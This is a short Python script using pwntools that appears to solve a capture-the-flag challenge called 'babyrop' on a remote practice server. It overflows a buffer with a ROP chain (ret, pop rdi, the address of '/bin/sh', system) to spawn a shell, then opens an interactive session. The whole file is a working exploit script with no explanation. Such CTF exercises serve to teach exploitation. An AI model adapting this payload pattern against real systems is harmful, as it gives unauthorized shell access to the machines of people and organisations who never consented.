from pwn import *
from LibcSearcher import *
from utils import show_ida_patch


def ru(x): print(io.recvuntil(x))
def rl(): print(io.recvline())
def sla(x, y): print(io.sendlineafter(x, y))
def sl(x): print(io.sendline(x))
def psize(x): return p64(x)
# 1. ret
# 2. io payload


io = remote('node4.buuoj.cn', 25810)
root = './babyrop'
# io = process(root)
elf = ELF(root)

# ROPgadget --binary <elf> | grep "ret"
pop_rdi_ret = 0x400683
ret = 0x0400479
bin_sh = 0x0601048
sys = 0x400490

payload = b'a'*(0x10+8)
payload += psize(ret)
payload += psize(pop_rdi_ret)
payload += psize(bin_sh)
payload += psize(sys)


show_ida_patch(payload, 0x18)
sl(payload)
io.interactive()
